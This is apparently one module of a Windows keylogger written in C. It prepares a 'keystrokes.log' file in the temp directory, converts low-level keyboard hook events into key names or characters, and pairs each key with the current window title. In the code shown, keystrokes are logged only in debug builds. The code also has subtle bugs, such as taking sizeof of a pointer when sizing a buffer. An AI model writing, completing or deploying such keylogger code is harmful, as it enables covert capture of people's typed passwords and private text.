#include "windows.h"
#include "stdafx.h"
#include "logger.h"

#define OUTPUT_FILE_NAME "keystrokes.log"

CHAR *pathToOutputFile;
FILE *outputFile;
BYTE keyboardState[256];
CHAR unicodeBuffer[16];

// Just initialize my global variables 
void InitWritter() {
	CHAR tempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, tempPath); // retrieving temp path
	// Approach to append 2 strings (char *)
	// We use malloc to separate exactly the length of the 2 strings + 1 for null termiator
	pathToOutputFile = (char *)malloc(sizeof(OUTPUT_FILE_NAME) + sizeof(tempPath) + 1);
	// Append tempPath with null terminator
	strcpy(pathToOutputFile, tempPath);
	// Finally concat to existent str with null terminator
	strcat(pathToOutputFile, OUTPUT_FILE_NAME);
#ifdef _DEBUG
	LogMessage("Path: %s\n", pathToOutputFile);
#endif // DEBUG
	outputFile = fopen(pathToOutputFile, "a+");
}

void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
	switch ((unsigned int)keyEvent->vkCode) {
		// About strcpy:
		//	char * strcpy ( char * destination, const char * source )
		//	- You may be vulnerable to buffer overflow (if you take user input as source)
		//  - It will append a null (\0) terminator at the end of string
		// So, no worries about buffer overflow since it's a constant what we are copying
	case 0xA1:
		strcpy(buffer, "[Right Shift]");
		break;
	case 0xA0:
		strcpy(buffer, "[Left Shift]");
		break;
	case 0x8:
		strcpy(buffer, "[Backspace]");
		break;
	case 0x1B:
		strcpy(buffer, "[Esc]");
		break;
	case 0x9:
		strcpy(buffer, "[Tab]");
		break;
	case 0x2E:
		strcpy(buffer, "[Delete]");
		break;
	case 0xA4:
		strcpy(buffer, "[Alt]");
		break;
	case 0x25:
		strcpy(buffer, "[Left]");
		break;
	case 0x26:
		strcpy(buffer, "[Up]");
		break;
	case 0x27:
		strcpy(buffer, "[Right]");
		break;
	case 0x28:
		strcpy(buffer, "[Down]");
		break;
	case 0xA2:
	case 0xA3:
		strcpy(buffer, "[Ctrl]");
		break;
	case 0xD:
		strcpy(buffer, "[\\n]");
		break;
	default:
		GetKeyboardState(keyboardState);
		ToUnicode(keyEvent->vkCode, keyEvent->scanCode, keyboardState, (LPWSTR)buffer, sizeof(buffer) / 2, 0);
		break;
	}
}

// Here we do the proccesing of the key event in order to print some human-readable output
void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, PKBDLLHOOKSTRUCT keyEvent) {
	ParseVirtualKeyCode(unicodeBuffer, keyEvent);
#ifdef _DEBUG	
	LogMessage("[%s]: %s (%d)\n", lastTitle, unicodeBuffer, keyEvent->vkCode);
#endif // DEBUG
}
